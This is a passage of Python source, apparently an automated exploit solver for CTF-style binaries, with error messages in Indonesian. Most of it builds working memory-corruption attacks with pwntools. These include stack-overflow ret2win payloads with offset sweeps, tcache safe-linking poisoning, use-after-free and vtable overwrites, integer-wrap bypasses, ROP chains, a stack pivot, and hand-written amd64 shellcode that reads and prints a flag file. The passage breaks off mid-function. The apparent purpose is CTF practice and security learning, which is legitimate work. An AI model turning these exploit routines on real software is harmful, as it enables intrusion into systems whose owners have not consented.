            "ret2libc_leak": ["ret2libc_leak"],
            "rop_print_flag": ["rop_print_flag"],
            "canary_leak_bof": ["canary_leak_bof"],
            "pie_leak_ret2win": ["pie_leak_ret2win"],
            "arbitrary_write_hook": ["arbitrary_write_hook"],
            "type_confusion_vtable": ["type_confusion_vtable"],
            "pico_picker_jump": ["pico_picker_jump"],
            "pico_local_target": ["pico_local_target"],
            "pico_segv_flag": ["pico_segv_flag"],
            "pico_format0": ["pico_format0"],
            "pico_format_stack_leak": ["pico_format_stack_leak"],
            "pico_format_sus_write": ["pico_format_sus_write"],
            "pico_format3_system": ["pico_format3_system"],
            "pico_echo_valley": ["pico_echo_valley"],
            "pico_heap_safevar": ["pico_heap_safevar"],
            "pico_heap_funcptr": ["pico_heap_funcptr"],
            "pico_heap3_uaf": ["pico_heap3_uaf"],
            "pico_two_sum": ["pico_two_sum"],
            "pico_basic_file": ["pico_basic_file"],
            "pico_rps": ["pico_rps"],
            "menu_handoff_shellcode": ["menu_handoff_shellcode"],
            "menu_gets_ret2flag": ["menu_gets_ret2flag"],
            "pico_ret2win_args": ["pico_ret2win_args"],
            "shellcode_memory_scan": ["shellcode_memory_scan"],
            "generic_symbol_ret2win": ["generic_symbol_ret2win"],
        }.get(template, [])
        generic = [
            "menu_file_read_traversal",
            "menu_handoff_shellcode",
            "two_stage_mmap_shellcode",
            "hidden_arg_format_write",
            "integer_logic_gate",
            "menu_uaf_patterns",
            "custom_freelist_menu",
            "bounded_admin_padding",
            "generic_symbol_ret2win",
            "callme_sequence",
            "ret2system_string",
            "write_string_print_file",
            "badchars_print_file",
            "fluff_print_file",
            "pivot_ret2win",
            "ret2csu_full_args",
            "i386_orw_shellcode",
            "i386_start_shellcode",
            "env_ld_preload_duplicate",
            "stack_ret2win",
            "format_leak",
            "arbitrary_write_hook",
            "negative_index_call",
            "off_by_one_auth",
            "rop_print_flag",
        ]
        if template == "generic" or any(re.search(r"admin|pass|auth|check|verify", s, re.I) for s in self.recon.get("strings", [])):
            generic.append("generic_input_fuzzer")
        merged: list[str] = []
        for name in preferred + generic:
            if name not in merged:
                merged.append(name)
        return merged

    def win_from_initial(self, prompt: bytes = b"") -> tuple[object, bytes, int]:
        p = self.start()
        init = self.recv_until_any_prompt(p, [prompt] if prompt else [b":\n", b"payload:\n", b"format:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        win = leaks.get("win") or self.target.elf.symbols.get("win")
        if not win:
            p.close()
            raise RuntimeError("alamat win tidak ditemukan")
        return p, init, int(win)

    def finalize(self, p, payload: bytes, strategy: str, confidence: int, vuln: str, offset: int | None = None, notes: list[str] | None = None) -> ExploitResult:
        p.send(payload)
        try:
            p.shutdown("send")
        except Exception:
            pass
        try:
            out = self.drain_available(p, timeout=2.0)
        finally:
            try:
                p.close()
            except Exception:
                pass
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy=strategy,
            success=flag is not None,
            confidence=confidence if flag else max(10, confidence - 40),
            output=out,
            flag=flag,
            payload=payload,
            notes=notes or [],
            vuln=vuln,
            offset=offset,
        )

    def exploit_stack_ret2win(self) -> ExploitResult:
        p, _init, win = self.win_from_initial(b"payload:\n")
        offset = 56
        payload = b"A" * offset + p64(win)
        return self.finalize(p, payload, "Ret2win", 95, "Stack buffer overflow to saved RIP", offset)

    def exploit_scanf_overflow(self) -> ExploitResult:
        p, _init, win = self.win_from_initial(b"name:\n")
        offset = 64
        payload = b"A" * offset + p64(win) + b"\n"
        return self.finalize(p, payload, "Scanf word overflow", 92, "Unbounded scanf(%s)", offset)

    def parse_strcpy_saved_rip_offset(self) -> int | None:
        disasm = self.disassemble_function("vuln") if "vuln" in self.target.elf.symbols else ""
        if "<vuln>" not in disasm:
            disasm = run_cmd(["objdump", "-d", "-M", "intel", str(self.target.binary)], cwd=self.target.cwd, timeout=8)
        lines = disasm.splitlines()
        ptr_size = 8 if self.target.elf.bits == 64 else 4
        for idx, line in enumerate(lines):
            if "<strcpy" not in line:
                continue
            block = "\n".join(lines[max(0, idx - 10) : idx])
            matches = re.findall(r"lea\s+rax,\[rbp-0x([0-9a-fA-F]+)\]", block)
            if matches:
                return int(matches[-1], 16) + ptr_size
        return None

    def parse_stack_read_saved_rip_offset(self) -> int | None:
        disasm = self.disassemble_function("vuln") if "vuln" in self.target.elf.symbols else ""
        if "<vuln>" not in disasm:
            disasm = run_cmd(["objdump", "-d", "-M", "intel", str(self.target.binary)], cwd=self.target.cwd, timeout=8)
        lines = disasm.splitlines()
        ptr_size = 8 if self.target.elf.bits == 64 else 4
        for idx, line in enumerate(lines):
            if "<read" not in line:
                continue
            block = "\n".join(lines[max(0, idx - 10) : idx])
            matches = re.findall(r"lea\s+rax,\[rbp-0x([0-9a-fA-F]+)\]", block)
            if matches:
                return int(matches[-1], 16) + ptr_size
        return None

    def primary_disassembly(self) -> str:
        for name in ("vuln", "main"):
            if name in self.target.elf.symbols:
                disasm = self.disassemble_function(name)
                if f"<{name}>" in disasm:
                    return disasm
        return run_cmd(["objdump", "-d", "-M", "intel", str(self.target.binary)], cwd=self.target.cwd, timeout=8)

    def parse_stack_read_to_compare_offset(self, value: int) -> int | None:
        disasm = self.primary_disassembly()
        read_buf_off: int | None = None
        lines = disasm.splitlines()
        for idx, line in enumerate(lines):
            if "<read" not in line:
                continue
            block = "\n".join(lines[max(0, idx - 10) : idx])
            matches = re.findall(r"lea\s+rax,\[rbp-0x([0-9a-fA-F]+)\]", block)
            if matches:
                read_buf_off = int(matches[-1], 16)
        if read_buf_off is None:
            return None
        marker = f"0x{value:x}"
        for line in lines:
            match = re.search(r"cmp\s+(?:DWORD|QWORD|WORD|BYTE)\s+PTR\s+\[rbp-0x([0-9a-fA-F]+)\],\s*" + re.escape(marker), line)
            if match:
                cmp_off = int(match.group(1), 16)
                if read_buf_off > cmp_off:
                    return read_buf_off - cmp_off
        return None

    def parse_stack_read_to_funcptr_offset(self) -> int | None:
        disasm = self.primary_disassembly()
        lines = disasm.splitlines()
        read_buf_off: int | None = None
        for idx, line in enumerate(lines):
            if "<read" not in line:
                continue
            block = "\n".join(lines[max(0, idx - 10) : idx])
            matches = re.findall(r"lea\s+rax,\[rbp-0x([0-9a-fA-F]+)\]", block)
            if matches:
                read_buf_off = int(matches[-1], 16)
        if read_buf_off is None:
            return None
        for idx, line in enumerate(lines):
            if not re.search(r"call\s+r(?:a|b|c|d)x|call\s+rdx|call\s+rax", line):
                continue
            block = "\n".join(lines[max(0, idx - 8) : idx + 1])
            matches = re.findall(r"mov\s+r(?:a|b|c|d)x,QWORD PTR \[rbp-0x([0-9a-fA-F]+)\]", block)
            if matches:
                ptr_off = int(matches[-1], 16)
                if read_buf_off > ptr_off:
                    return read_buf_off - ptr_off
        return None

    def exploit_strcpy_overflow(self) -> ExploitResult:
        offset = 72
        if self.target.source and self.target.source.exists():
            src = self.target.source.read_text(encoding="utf-8", errors="replace")
            match = re.search(r"char\s+dst\[(\d+)\]", src)
            if match:
                offset = int(match.group(1)) + 8
        parsed_offset = self.parse_strcpy_saved_rip_offset()
        if parsed_offset:
            offset = parsed_offset
        step = 4 if self.target.elf.bits == 32 else 8
        offsets = list(range(max(step, offset - 64), offset + 161, step))
        if offset not in offsets:
            offsets.insert(0, offset)
        for candidate_offset in offsets:
            p = self.start()
            init = self.recv_until_any_prompt(p, [b"copy source:\n", b": ", b"\n"], timeout=0.8)
            leaks = self.parse_leaks(init)
            win = leaks.get("win") or self.target.elf.symbols.get("win")
            if not win:
                p.close()
                raise RuntimeError("alamat win tidak ditemukan")
            try:
                p.close()
            except Exception:
                pass
            full = self.pack_addr(int(win))
            chains = [full]
            if self.target.elf.bits == 64 and not self.target.elf.pie:
                nul = full.find(b"\x00")
                if nul > 0:
                    chains.insert(0, full[: nul + 1])
            for chain in chains:
                p = self.start()
                self.recv_until_any_prompt(p, [b"copy source:\n", b": ", b"\n"], timeout=0.8)
                payload = b"A" * candidate_offset + chain + b"\n"
                p.send(payload)
                try:
                    p.shutdown("send")
                except Exception:
                    pass
                try:
                    out = p.recvall(timeout=1.2)
                finally:
                    p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="Strcpy overflow",
                        success=True,
                        confidence=90,
                        output=out,
                        flag=flag,
                        payload=payload,
                        vuln="strcpy into smaller stack destination",
                        offset=candidate_offset,
                        notes=[f"win={hex(int(win))}", f"addr_bytes={len(chain)}"],
                    )
        return ExploitResult(
            strategy="Strcpy overflow",
            success=False,
            confidence=30,
            vuln="strcpy into smaller stack destination",
            offset=offset,
            notes=["Offset sweep tidak menghasilkan flag."],
        )

    def exploit_off_by_one_auth(self) -> ExploitResult:
        p = self.start()
        self.recv_until_any_prompt(p, [b"nickname:\n"], timeout=1.0)
        payload = b"A" * 40 + b"\x01\n"
        return self.finalize(p, payload, "Off-by-one admin flip", 96, "Loop writes one byte past token.name", 40)

    def exploit_negative_index_call(self) -> ExploitResult:
        p = self.start()
        self.recv_until_any_prompt(p, [b"index:\n"], timeout=1.0)
        payload = b"-1\n"
        return self.finalize(p, payload, "Negative index dispatch", 96, "Signed index allows actions[-1]", -1)

    def exploit_oob_write_hook(self) -> ExploitResult:
        p, init, win = self.win_from_initial(b"value:\n")
        leaks = self.parse_leaks(init)
        hook = leaks.get("hook_slot")
        notes = [f"hook_slot={hex(hook)}"] if hook else []
        index = 4
        if hook and "vault" in self.target.elf.symbols:
            index = (hook - int(self.target.elf.symbols["vault"])) // 8
        elif self.target.source and self.target.source.exists():
            src = self.target.source.read_text(encoding="utf-8", errors="replace")
            match = re.search(r"slots\[(\d+)\]", src)
            if match:
                index = int(match.group(1))
        payload = f"{index}\n{win}\n".encode()
        return self.finalize(p, payload, "OOB array write hook", 95, f"slots[{index}] aliases hook pointer", index, notes)

    def exploit_arbitrary_write_hook(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"where:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        hook = leaks.get("hook_ptr")
        win = leaks.get("win")
        if not hook or not win:
            raise RuntimeError("hook/win leak tidak ditemukan")
        payload = f"{hook}\n{win}\n".encode()
        return self.finalize(p, payload, "Write-what-where hook", 98, "Arbitrary write replaces function hook", None, [f"hook={hex(hook)}", f"win={hex(win)}"])

    def exploit_type_confusion_vtable(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"object bytes:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        win_ops = leaks.get("win_ops")
        if not win_ops:
            raise RuntimeError("win_ops leak tidak ditemukan")
        offset = 48
        if self.target.source and self.target.source.exists():
            src = self.target.source.read_text(encoding="utf-8", errors="replace")
            match = re.search(r"char\s+name\[(\d+)\]", src)
            if match:
                offset = int(match.group(1))
        payload = b"A" * offset + p64(win_ops)
        return self.finalize(p, payload, "Type confusion vtable", 94, "Object ops pointer overwritten", offset, [f"win_ops={hex(win_ops)}"])

    def exploit_uaf_funcptr(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"reuse data:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        win = leaks.get("win")
        if not win:
            raise RuntimeError("win leak tidak ditemukan")
        offset = 24
        payload = b"A" * offset + p64(win)
        return self.finalize(p, payload, "Use-after-free callback", 94, "Freed cell reused and stale callback invoked", offset)

    def exploit_heap_overflow_hook(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"heap note:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        note = leaks.get("note")
        record = leaks.get("record")
        win = leaks.get("win")
        if not note or not record or not win:
            raise RuntimeError("note/record/win leak tidak lengkap")
        offset = (record - note) + 24
        payload = b"A" * offset + p64(win)
        return self.finalize(p, payload, "Heap overflow function pointer", 90, "Heap note overflows adjacent record callback", offset, [f"record-note={record-note}"])

    def tcache_poison_common(self, menu_token: bytes, hook_key: str, alloc_word: str, free_word: str, edit_word: str, call_choice: str, target_minus: int | None) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [menu_token], timeout=1.0)
        leaks = self.parse_leaks(init)
        hook = leaks.get(hook_key)
        win = leaks.get("win")
        if not hook or not win:
            raise RuntimeError("hook/win leak tidak ditemukan")
        if target_minus is None:
            target_minus = 0 if hook % 16 == 0 else -8

        def ru() -> bytes:
            return self.recv_until_any_prompt(p, [menu_token], timeout=1.0)

        size = 16
        p.send(f"{alloc_word}\n0\n{size}\n".encode())
        out = ru()
        m = re.search(rb"(?:chunk|box)\[0\]=(0x[0-9a-fA-F]+)", out)
        if not m:
            raise RuntimeError("chunk leak tidak ditemukan")
        chunk = int(m.group(1), 16)

        p.send(f"{free_word}\n0\n".encode())
        ru()
        target = hook + target_minus
        encoded = target ^ (chunk >> 12)
        p.send(f"{edit_word}\n0\n".encode())
        self.recv_until_any_prompt(p, [b"idx:\n"], timeout=1.0)
        p.send(p64(encoded) + b"A" * (size - 8))
        ru()

        p.send(f"{alloc_word}\n1\n{size}\n".encode())
        ru()
        p.send(f"{alloc_word}\n2\n{size}\n".encode())
        ru()
        p.send(f"{edit_word}\n2\n".encode())
        self.recv_until_any_prompt(p, [b"idx:\n"], timeout=1.0)
        if target_minus == -8:
            p.send(b"P" * 8 + p64(win))
        else:
            p.send(p64(win) + b"P" * 8)
        ru()
        p.send(f"{call_choice}\n".encode())
        out = p.recvall(timeout=2.0)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="Tcache safe-linking poison",
            success=flag is not None,
            confidence=88 if flag else 35,
            output=out,
            flag=flag,
            payload=b"<interactive menu payload>",
            notes=[f"chunk={hex(chunk)}", f"target={hex(target)}", f"encoded_fd={hex(encoded)}"],
            vuln="UAF edit poisons tcache freelist",
        )

    def exploit_double_free_menu(self) -> ExploitResult:
        return self.tcache_poison_common(b"6 call_hook\n", "heap_hook", "1", "2", "3", "6", None)

    def exploit_tcache_poison_menu(self) -> ExploitResult:
        return self.tcache_poison_common(b"6 call\n", "target_hook", "1", "2", "3", "6", None)

    def menu_line(self, tube, value: int | str, timeout: float = 0.22) -> bytes:
        tube.send(str(value).encode() + b"\n")
        return self.drain_available(tube, timeout=timeout, idle=0.03)

    def menu_raw(self, tube, payload: bytes, timeout: float = 0.22) -> bytes:
        tube.send(payload)
        return self.drain_available(tube, timeout=timeout, idle=0.03)

    def run_menu_uaf_attack(self, tube, strategy: str) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        symbols = self.target.elf.symbols
        if not re.search(r"free|reuse|dangling|vtable|delete", hay, re.I):
            raise RuntimeError("pola menu UAF tidak cocok")

        output = self.drain_available(tube, timeout=0.35, idle=0.03)
        notes: list[str] = []
        if "target" in symbols and re.search(r"writer|check|target=", hay, re.I):
            target = int(symbols["target"])
            magic = 0x1337133713371337
            output += self.menu_line(tube, 1)
            output += self.menu_line(tube, 2)
            output += self.menu_line(tube, 3)
            output += self.menu_raw(tube, b"A" * 16 + p64(target) + p64(magic))
            output += self.menu_line(tube, 4)
            output += self.menu_line(tube, 5)
            vuln = "Use-after-free writer reuses a freed object as an arbitrary 8-byte write primitive"
            notes.extend([f"target={hex(target)}", f"magic={hex(magic)}"])
        elif "real_vtable" in symbols and "win" in symbols:
            win = int(symbols["win"])
            output += self.menu_line(tube, 1, timeout=0.35)
            match = re.search(rb"0x[0-9a-fA-F]+", output)
            if not match:
                raise RuntimeError("leak object heap tidak ditemukan")
            obj = int(match.group(0), 16)
            output += self.menu_line(tube, 2)
            output += self.menu_line(tube, 3)
            output += self.menu_raw(tube, p64(obj + 8) + p64(win) + b"A" * 24)
            output += self.menu_line(tube, 4)
            vuln = "Use-after-free object reuse installs an in-chunk fake vtable from the runtime heap leak"
            notes.extend([f"object={hex(obj)}", f"fake_vtable={hex(obj + 8)}", f"win={hex(win)}"])
        elif "win" in symbols:
            win = int(symbols["win"])
            output += self.menu_line(tube, 1)
            output += self.menu_raw(tube, b"SilverPWN\n")
            output += self.menu_line(tube, 2)
            output += self.menu_line(tube, 3)
            output += self.menu_raw(tube, p64(win) + b"A" * 24)
            output += self.menu_line(tube, 4)
            vuln = "Use-after-free callback object is reallocated and its function pointer is replaced"
            notes.append(f"win={hex(win)}")
        else:
            raise RuntimeError("symbol target/real_vtable/win untuk UAF tidak ditemukan")

        output += self.drain_available(tube, timeout=1.0, idle=0.04)
        flag = extract_flag(output, self.args.flag)
        return ExploitResult(
            strategy=strategy,
            success=flag is not None,
            confidence=88 if flag else 35,
            output=output,
            flag=flag,
            payload=b"<interactive menu payload>",
            vuln=vuln,
            notes=notes,
        )

    def exploit_menu_uaf_patterns(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        if not re.search(r"1\.(?:new|create).*2\.(?:free|delete).*3\.(?:reuse|note)", hay, re.I | re.S):
            raise RuntimeError("menu UAF 1/2/3 tidak cocok")
        p = self.start()
        try:
            return self.run_menu_uaf_attack(p, "Menu UAF pattern")
        finally:
            try:
                p.close()
            except Exception:
                pass

    def run_custom_freelist_attack(self, tube, strategy: str) -> ExploitResult:
        symbols = self.target.elf.symbols
        if "free_head" not in symbols or "slots" not in symbols:
            raise RuntimeError("custom freelist symbols tidak ditemukan")
        if "win" not in symbols:
            raise RuntimeError("symbol win tidak ditemukan")

        output = self.drain_available(tube, timeout=0.35, idle=0.03)
        win = int(symbols["win"])
        hook = int(symbols.get("hook", 0))
        notes = [f"win={hex(win)}"]

        if not hook:
            output += self.menu_line(tube, 1)
            output += self.menu_line(tube, 0)
            output += self.menu_line(tube, 3)
            output += self.menu_line(tube, 0)
            output += self.menu_raw(tube, p64(win))
            output += self.menu_line(tube, 4)
            output += self.menu_line(tube, 0)
            vuln = "Custom allocator object can be edited and called as a function pointer"
        else:
            for choice, idx in ((1, 0), (1, 1), (2, 0), (2, 1), (2, 0)):
                output += self.menu_line(tube, choice)
                output += self.menu_line(tube, idx)

            encoded_target = hook
            if "secret" in symbols:
                output += self.menu_line(tube, 4)
                output += self.menu_line(tube, 0)
                match = re.search(rb"secret_hint=(0x[0-9a-fA-F]+)", output)
                if not match:
                    raise RuntimeError("secret safe-linking tidak bocor")
                secret = int(match.group(1), 16)
                encoded_target = hook ^ secret
                notes.append(f"secret={hex(secret)}")

            output += self.menu_line(tube, 3)
            output += self.menu_line(tube, 0)
            output += self.menu_raw(tube, p64(encoded_target))
            output += self.menu_line(tube, 1)
            output += self.menu_line(tube, 2)
            output += self.menu_line(tube, 1)
            output += self.menu_line(tube, 3)
            output += self.menu_line(tube, 3)
            output += self.menu_line(tube, 3)
            output += self.menu_raw(tube, p64(win))
            output += self.menu_line(tube, 5 if "secret" in symbols else 4)
            vuln = "Double-free custom freelist poisoning returns an allocation overlapping the global hook"
            notes.extend([f"hook={hex(hook)}", f"encoded_target={hex(encoded_target)}"])

        output += self.drain_available(tube, timeout=1.0, idle=0.04)
        flag = extract_flag(output, self.args.flag)
        return ExploitResult(
            strategy=strategy,
            success=flag is not None,
            confidence=90 if flag else 35,
            output=output,
            flag=flag,
            payload=b"<interactive menu payload>",
            vuln=vuln,
            notes=notes,
        )

    def exploit_custom_freelist_menu(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        if not ("free_head" in self.target.elf.symbols and "slots" in self.target.elf.symbols and re.search(r"alloc.*free.*edit", hay, re.I | re.S)):
            raise RuntimeError("pola custom freelist menu tidak cocok")
        p = self.start()
        try:
            return self.run_custom_freelist_attack(p, "Custom freelist menu")
        finally:
            try:
                p.close()
            except Exception:
                pass

    def exploit_integer_overflow_read(self) -> ExploitResult:
        p, _init, win = self.win_from_initial(b"length:\n")
        offset = self.parse_stack_read_saved_rip_offset() or 88
        raw = 65472
        payload = f"{raw}\n".encode() + b"A" * offset + p64(win)
        return self.finalize(p, payload, "Integer overflow length", 88, "16-bit checked length wraps before read", offset, [f"raw length={raw}"])

    def exploit_integer_underflow_read(self) -> ExploitResult:
        p, _init, win = self.win_from_initial(b"signed length:\n")
        offset = self.parse_stack_read_saved_rip_offset() or 72
        payload = b"-1\n" + b"A" * offset + p64(win)
        return self.finalize(p, payload, "Integer underflow length", 88, "Negative signed length cast to size_t", offset)

    def exploit_length_truncation(self) -> ExploitResult:
        p, _init, win = self.win_from_initial(b"length:\n")
        offset = self.parse_stack_read_saved_rip_offset() or 72
        raw = 256
        payload = f"{raw}\n".encode() + b"A" * offset + p64(win)
        return self.finalize(p, payload, "Length truncation overflow", 88, "8-bit tiny length passes while raw length overflows", offset, [f"raw length={raw}"])

    def run_prompted_payload_once(self, payload: bytes, timeout: float = 2.0) -> bytes:
        p = self.start()
        banner = self.recv_until_any_prompt(p, [b": ", b"> ", b"? ", b"\n"], timeout=0.5)
        p.send(payload)
        try:
            p.shutdown("send")
        except Exception:
            pass
        try:
            out = self.drain_available(p, timeout=timeout)
        finally:
            try:
                p.close()
            except Exception:
                pass
        return banner + out

    def exploit_integer_logic_gate(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        if "__isoc99_scanf" not in self.target.elf.plt and "__isoc99_scanf" not in self.target.elf.got:
            raise RuntimeError("integer gate membutuhkan scanf")
        if not re.search(r"integer|underflow|qty:|copy_len|need=|budget|len", hay, re.I):
            raise RuntimeError("pola integer gate tidak cocok")

        marker_offset = self.parse_stack_read_to_compare_offset(0x41424344) or 0x20
        funcptr_offset = self.parse_stack_read_to_funcptr_offset() or 0x40
        candidates: list[tuple[str, bytes, int | None]] = [
            ("32-bit multiplication wrap", b"42949673\n", None),
            ("Unsigned subtract length underflow", b"0\n" + b"A" * marker_offset + b"DCBA", marker_offset),
        ]
        win = int(self.target.elf.symbols.get("win", 0))
        if win:
            for raw in (b"-8\n", b"4294967288\n"):
                candidates.append((f"Validator add overflow to function pointer ({raw.strip().decode()})", raw + b"A" * funcptr_offset + p64(win), funcptr_offset))

        tried: list[str] = []
        for name, payload, offset in candidates:
            tried.append(name)
            out = self.run_prompted_payload_once(payload, timeout=2.5)
            flag = extract_flag(out, self.args.flag)
            if flag:
                notes = [f"attempt={name}", f"attempts={len(tried)}"]
                if win:
                    notes.append(f"win={hex(win)}")
                return ExploitResult(
                    strategy="Integer logic gate",
                    success=True,
                    confidence=84,
                    output=out,
                    flag=flag,
                    payload=payload,
                    vuln="Integer wrap/underflow makes a guarded arithmetic check accept an unsafe value",
                    offset=offset,
                    notes=notes,
                )
        return ExploitResult(
            strategy="Integer logic gate",
            success=False,
            confidence=25,
            vuln="Integer wrap/underflow guarded path",
            notes=[f"attempts={len(tried)}", f"marker_offset={marker_offset}", f"funcptr_offset={funcptr_offset}"],
        )

    def exploit_pie_leak_ret2win(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"payload:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        win = leaks.get("win_offset_hint") or leaks.get("win") or self.target.elf.symbols.get("win")
        if not win:
            raise RuntimeError("PIE win leak tidak ditemukan")
        offset = self.parse_stack_read_saved_rip_offset() or 56
        chains = [p64(win)]
        main_leak = leaks.get("main")
        if main_leak and "main" in self.target.elf.symbols:
            try:
                base = int(main_leak) - int(self.target.elf.symbols["main"])
                rop = ROP(self.target.elf)
                gadget = rop.find_gadget(["ret"])
                if gadget:
                    chains.insert(0, p64(base + int(gadget.address)) + p64(win))
            except Exception:
                pass
        for chain in chains:
            payload = b"A" * offset + chain
            p.send(payload)
            try:
                p.shutdown("send")
            except Exception:
                pass
            try:
                out = self.drain_available(p, timeout=2.0)
            finally:
                try:
                    p.close()
                except Exception:
                    pass
            flag = extract_flag(out, self.args.flag)
            if flag:
                return ExploitResult(
                    strategy="PIE leak ret2win",
                    success=True,
                    confidence=94,
                    output=out,
                    flag=flag,
                    payload=payload,
                    vuln="PIE address leaked before stack overflow",
                    offset=offset,
                    notes=[f"win={hex(win)}", f"chain_len={len(chain)}"],
                )
            break
        return ExploitResult(
            strategy="PIE leak ret2win",
            success=False,
            confidence=35,
            output=out if "out" in locals() else b"",
            payload=payload if "payload" in locals() else b"",
            vuln="PIE address leaked before stack overflow",
            offset=offset,
            notes=[f"win={hex(win)}", "Payload tidak menghasilkan flag."],
        )

    def exploit_rop_print_flag(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"rop payload:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        pop_rdi = leaks.get("pop_rdi")
        print_file = leaks.get("print_file")
        flag_path = leaks.get("flag_path")
        if not pop_rdi or not print_file or not flag_path:
            raise RuntimeError("ROP leaks tidak lengkap")
        offset = 56
        payload = b"A" * offset + p64(pop_rdi) + p64(flag_path) + p64(print_file)
        return self.finalize(p, payload, "ROP print_file(flag_path)", 93, "ROP chain calls print_file with flag_path", offset)

    def exploit_stack_pivot(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"stage one:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        pivot = leaks.get("pivot_area")
        leave_ret = leaks.get("leave_ret")
        win = leaks.get("win")
        if not pivot or not leave_ret or not win:
            raise RuntimeError("pivot leaks tidak lengkap")
        stage1 = p64(0) + p64(win) + b"A" * 32
        p.send(stage1)
        self.recv_until_any_prompt(p, [b"stage two:\n"], timeout=1.0)
        offset = 56
        if self.target.source and self.target.source.exists():
            src = self.target.source.read_text(encoding="utf-8", errors="replace")
            match = re.search(r"char\s+buf\[(\d+)\]", src)
            if match:
                offset = int(match.group(1)) + 8
        stage2 = b"B" * offset + p64(win)
        return self.finalize(
            p,
            stage2,
            "Stack pivot challenge ret2win",
            84,
            "Stage-two stack overflow controls RIP; pivot gadgets were reconfirmed",
            offset,
            [f"pivot={hex(pivot)}", f"leave_ret={hex(leave_ret)}"],
        )

    def flag_shellcode(self) -> bytes:
        context.clear(arch="amd64", os="linux")
        context.log_level = "error"
        return asm(
            """
            xor edx, edx
            mov rbx, 0x7478742e67616c66
            push rdx
            push rbx
            mov rdi, rsp
            xor esi, esi
            mov eax, 2
            syscall
            mov edi, eax
            mov rsi, rsp
            mov dl, 0x80
            xor eax, eax
            syscall
            mov edx, eax
            mov edi, 1
            mov eax, 1
            syscall
            xor edi, edi
            mov eax, 60
            syscall
            """
        )

    def find_text_gadget(self, needle: bytes) -> int | None:
        section = self.target.elf.get_section_by_name(".text")
        if not section:
            return None
        start = int(section.header.sh_addr)
        end = start + int(section.header.sh_size)
        for addr in self.target.elf.search(needle):
            if start <= int(addr) < end:
                return int(addr)
        return None

    def parse_menu_handoff_layout(self) -> tuple[int, int, int, int | None] | None:
        disasm = self.disassemble_function("vuln") if "vuln" in self.target.elf.symbols else ""
        if "<vuln>" not in disasm:
            disasm = run_cmd(["objdump", "-d", "-M", "intel", str(self.target.binary)], cwd=self.target.cwd, timeout=8)

        lines = disasm.splitlines()
        message_layout: tuple[int, int, int] | None = None
        review_layout: tuple[int, int, int | None] | None = None

        for idx, line in enumerate(lines):
            lea = re.search(r"lea\s+rsi,\[rbp-0x([0-9a-fA-F]+)\]", line)
            if not lea:
                continue
            block = "\n".join(lines[idx : idx + 22])
            add = re.search(r"add\s+rax,0x([0-9a-fA-F]+)", block)
            size = re.search(r"mov\s+esi,0x([0-9a-fA-F]+)", block)
            if add and size and "<fgets" in block:
                message_layout = (int(lea.group(1), 16), int(add.group(1), 16), int(size.group(1), 16))
                break

        for idx, line in enumerate(lines):
            lea = re.search(r"lea\s+rax,\[rbp-0x([0-9a-fA-F]+)\]", line)
            if not lea:
                continue
            block = "\n".join(lines[idx : idx + 12])
            size = re.search(r"mov\s+esi,0x([0-9a-fA-F]+)", block)
            if not size or "<fgets" not in block:
                continue
            nul = re.search(r"mov\s+BYTE PTR \[rbp-0x([0-9a-fA-F]+)\],0x0", block)
            review_layout = (int(lea.group(1), 16), int(size.group(1), 16), int(nul.group(1), 16) if nul else None)
            break

        if not message_layout or not review_layout:
            return None

        array_off, message_add, message_size = message_layout
        review_off, review_size, nul_off = review_layout
        if review_size < 16 or message_size < 24:
            return None

        offset_to_rip = review_off + (8 if self.target.elf.bits == 64 else 4)
        landing_delta = array_off - message_add - review_off
        zero_index = review_off - nul_off if nul_off is not None and nul_off < review_off else None
        if offset_to_rip <= 0 or landing_delta <= 0:
            return None
        return landing_delta, offset_to_rip, message_size, zero_index

    def exploit_menu_handoff_shellcode(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        if not all(re.search(needle, hay, re.I) for needle in (r"Add a new recipient", r"send a message", r"quick review")):
            raise RuntimeError("pola menu handoff recipient/message/review tidak cocok")
        if self.target.elf.bits != 64 or self.target.elf.pie or self.target.elf.nx or self.target.elf.canary:
            raise RuntimeError("handoff shellcode butuh amd64 non-PIE tanpa canary dengan stack executable")

        layout = self.parse_menu_handoff_layout()
        if not layout:
            raise RuntimeError("layout stack handoff tidak dapat diparse dari disassembly")
        landing_delta, offset_to_rip, message_size, zero_index = layout

        jmp_rax = self.find_text_gadget(b"\xff\xe0")
        if not jmp_rax:
            raise RuntimeError("gadget jmp rax tidak ditemukan di .text")

        sc = self.flag_shellcode()
        if len(sc) > message_size - 1:
            raise RuntimeError(f"shellcode terlalu panjang untuk fgets({message_size}): {len(sc)}")

        if zero_index is not None and 0 <= zero_index < offset_to_rip:
            code_start = zero_index + 3
            filler = max(0, code_start - 2)
            stage_asm = f"""
                jmp short stage_entry
                .fill {filler}, 1, 0x90
            stage_entry:
                sub rax, {landing_delta}
                jmp rax
            """
        else:
            stage_asm = f"""
                sub rax, {landing_delta}
                jmp rax
            """
        stage = asm(stage_asm)
        if len(stage) > offset_to_rip:
